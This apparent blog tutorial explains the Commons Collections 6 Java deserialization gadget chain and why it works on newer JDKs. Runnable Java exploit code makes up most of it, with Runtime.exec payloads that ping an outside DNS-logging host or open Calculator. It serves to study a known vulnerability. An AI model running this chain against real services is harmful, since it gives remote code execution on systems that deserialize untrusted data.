---
layout: mypost
title: "最实用的链-CommonCollections6链"
categories: [Java安全]
---

## 前言

非标题党，CC6 确实整个 CC 链中最好用的、最通用的，是为了解决⾼版本 Java 的利⽤问题。

研究 CC1 开始之际，配置环境就是安装的 Java 8u71 之前的 JDK 版本，CC1 的 EntryClass（AnnotationInvocationHandler）是在 sun 包下的，这是 JDK 自带的代码，只有在 8u71 之前的 JDK 版本它的这个类才会出现漏洞，而 8u71 之后的版本就修复了这个问题，详情见下-->

![](image-94.png)

可以看到修复之后的代码中已经不存在`memberValue.setValue(xxx)`这行代码了，CC1 中走 TransformedMap 那条链算是被彻底修复，再看走 LazyMap 那条链子，查看堆栈调用情况，它的 entrySet 方法也确实能触发 invoke-->

![](image-96.png)

但此时的 memberValues 不再是 LazyMap 的实例了，而是如下这个-->

![](image-97.png)

调试器切换到 JDK8u65，看一下此时的 memberValues（这里项目结构没改，看的是反编译的文件）

![](image-95.png)

通过对比可以发现 memberValues 的值被换掉了，所以这条链也不行了，至此 JDK 版本升级后彻底修复了 CC1 漏洞。

## 另辟蹊径

根据上述分析，CC1 不仅对 CommonCollections 的版本有要求，也对 JDK 的版本有要求，有没有办法绕过对 JDK 版本的限制，CC6 这条链给出了答案。CC6 前面和 CC1 是一样的，都是到 LazyMap 那里-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        lazyMap.get(null);
    }
}
```

既然 AnnotationInvocationHandler 不再能用了，且这回不希望在 JDK 源码中找 gadget，就得继续去找哪个类有这种 xxx.get()的形式，且 xxx 能被控制。ysoserial 的作者在 CommonCollections 源码中找到了`org.apache.commons.collections.keyvalue.TiedMapEntry`这样一个类（这样就不受 JDK 版本的限制了），它的
getValue 方法中调用了`map.get(key)`如下-->

![](image-98.png)

其中这个 map 是可以被控制的，现在改一下代码-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
        tiedMapEntry.getValue();
    }
}
```

运行结果如下-->

![](image-48.png)

现在最好是去找一个 EntryClass，它的 readObject 方法中能调用 xxx.getValue()，但 CC6 的作者发现就在 TiedMapEntry 类中的 hashCode 就调用了 getValue()方法，而 hashCode 方法之前在 URLDNS 链中就被用到过，URLDNS 链有完美的入口类 HashMap，这下两者拼接一下即可，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        entryMap.put(tiedMapEntry, 1);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

执行后成功触发 DNS 请求，但这并不是预期的！

![](image-48.png)

还是老问题，在下面这里下一个断点-->

![](image-99.png)

跟堆栈可以发现并不是反序列化触发的，而是`entryMap.put(tiedMapEntry, 1);`这行代码触发的，详情见下-->

![](image-100.png)

同时运行完上述代码看报错信息可以发现，它并没有成功的序列化！这样子连恶意 Payload 都生成不了，详情如下-->

![](image-101.png)

不解决这两个问题，链子没法用！

## 解决问题

另辟蹊径中提出的两个问题，其实是一个原因造成的，都是因为`entryMap.put(tiedMapEntry, 1);`这行代码执行后直接触发了 sink，而 sink 一旦被触发就会新建线程、命令执行等等一系列的操作，不能保证其中所有的操作都继承了 Serializable 接口，自然不会被序列化成功。借鉴 URLDNS 链的思想，反射改一下 tiedMapEntry 里面的东西，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,null);
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

其中的这几行代码将 tiedMapEntry 中的 key 值改为 null-->

```java
Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
Field field = clazzTiedMapEntry.getDeclaredField("map");
field.setAccessible(true);
field.set(tiedMapEntry,null);
```

下个断点验证一下-->

![](image-102.png)

那么这样子`entryMap.put(tiedMapEntry, 1);`自然不会触发到 sink，但是这样子代码都无法正常执行了，改一改也简单，就是把`field.set(tiedMapEntry,null);`改成`field.set(tiedMapEntry,new HashMap());`保证是一个 Map 类型即可，此时调试一下，结果如下-->

![](image-103.png)

显然是无法触发到 sink，且代码正常执行。代码走到反序列化的时候，开始走预期的 gadget，这时候再到 TiedMapEntry 类的 getValue 函数，它的 map 已经被改回了 lazyMap，详情如下-->

![](image-104.png)

至此 CC6 完结，完整代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"open /System/Applications/Calculator.app"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

运行后成功触发 DNS 请求，如下-->

![](image-48.png)

Tips：这里还有一个注意点，此处下断点跟一下-->

![](image-105.png)

难道这个 Payload 是假的吗？？？其实不然，网上的 Payload 都是清一色的去修改 lazyMap 中 factory 的值，所以在`entryMap.put(tiedMapEntry, 1);`的时候会导致执行到以下这个地方-->

![](image-106.png)

所以一定要在 Payload 中去 remove 掉 key 的值，而以上这种写法的 Payload 是不会走这里的，按理来说也不用去像网上其他 Payload 一样去 remove 掉 key 的值，那为什么这里会平白无故的出现一个名为 abc 的 key？？？这和 IDEA 的调试器设置有关，把 IDEA 设置中以下的两个选项关掉就没有问题了-->

![](image-107.png)

对同样的代码再次进行调试，结果如下-->

![](image-108.png)

真是薛定谔的 CC6！但毫无疑问它是最实用的 CC 链！